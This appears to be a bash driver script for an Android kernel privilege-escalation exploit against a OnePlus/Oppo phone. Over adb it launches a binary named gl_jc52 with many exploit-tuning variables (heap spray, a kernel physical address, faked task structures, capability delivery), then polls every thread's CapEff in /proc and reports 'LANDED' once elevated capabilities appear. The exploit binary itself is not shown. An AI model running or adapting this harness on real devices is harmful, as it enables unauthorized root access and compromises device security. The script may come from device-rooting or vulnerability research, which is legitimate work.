#!/bin/bash
# run7: fire jc52 config and poll every thread's CapEff for a non-zero
cd "/c/Users/LENOVO/Desktop/HILY installer/Oppo/ghostlock-oneplus"
ADB=./adb_local.exe
$ADB connect 192.168.1.2:5555 >/dev/null 2>&1
$ADB -s 192.168.1.2:5555 shell "cd /data/local/tmp; rm -f /data/local/tmp/jc53_1.txt; nohup sh -c 'timeout 300 env MODE4_ONLY=1 MODE4_SLIDE_SWAP=1 WRITE_PROOF_TARGET=bootid MODE4_JC2=1 MODE4_JC2_MAIN=1 MODE4_JC2_QUIET_ENTRY=1 MODE4_JC2_LATE_MIDSTAMP=1 PSELECT_LATE_UNLOCK=0 MODE4_JC2_SPINSTAMP=1 MODE4_GHOST_PRIO=130 MODE4_OWNER_TASK=1 MODE4_W0TASK_FAKE=1 MODE4_CAPSONLY=1 MODE4_CAPS_CHILD=1 MODE4_CAPS778=1 MODE4_CC_DELIVERY=1 MODE4_TARGET_WAITER=1 MODE4_CAPS_NOCONT=1 PSELECT_PUNCH_IN_BLOCK=1 PSELECT_NICE_STAIRS=1 SPIN_BLOCK_EVERY=8 SPIN_BLOCK_MS=3 SPIN_MAX_ITERS=32 PSELECT_GHOST_SELF_LOCK=1 PSELECT_GHOST_DELTA=0 PERFDUMP_SEL=1 PSELECT_SHIFT=0 SPRAY_ALIAS_MAX=0 FOPS_MAX_ATTEMPTS=24 KPHYS=0xa8000000 UID0_NO_SYNCLOG=1 PSELECT_ROUTE_DELAY_USEC=60000 /data/local/tmp/gl_jc52' > /data/local/tmp/jc53_1.txt 2>&1 &" >/dev/null 2>&1
echo "RUN7 fired $(date +%H:%M:%S)"
for i in $(seq 1 40); do
  sleep 3
  OUT=$(timeout 20 $ADB -s 192.168.1.2:5555 shell 'PID=$(ps -A | grep gl_jc52 | grep -v uid0 | awk "{print \$2}" | head -1); if [ -n "$PID" ]; then for T in /proc/$PID/task/*; do C=$(grep -a CapEff $T/status 2>/dev/null | awk "{print \$2}"); [ "$C" != "0000000000000000" ] && [ -n "$C" ] && echo "LANDED tid=$(basename $T) CapEff=$C"; done; fi' 2>/dev/null | tr -d '\r')
  if echo "$OUT" | grep -q LANDED; then
    echo "$OUT"
    echo "DELIVERY DETECTED at poll $i"
    break
  fi
done
echo poll-done
